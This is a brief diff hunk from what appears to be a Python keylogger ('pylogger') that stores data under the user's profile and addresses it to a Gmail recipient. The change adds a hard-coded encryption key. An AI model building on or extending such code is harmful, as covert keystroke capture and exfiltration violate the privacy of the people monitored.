@@ -55,6 +55,8 @@ toaddr = "divkirnapure7@gmail.com"
 
 username = getpass.getuser()
 
+key = "ZKG-hah0-GiBfJOqhwbzobPEvh9z1xhFOPYIimr5Id4="
+
 file_path = f"C:\\Users\\{username}\\pylogger"
 os.makedirs(file_path, exist_ok=True)
 
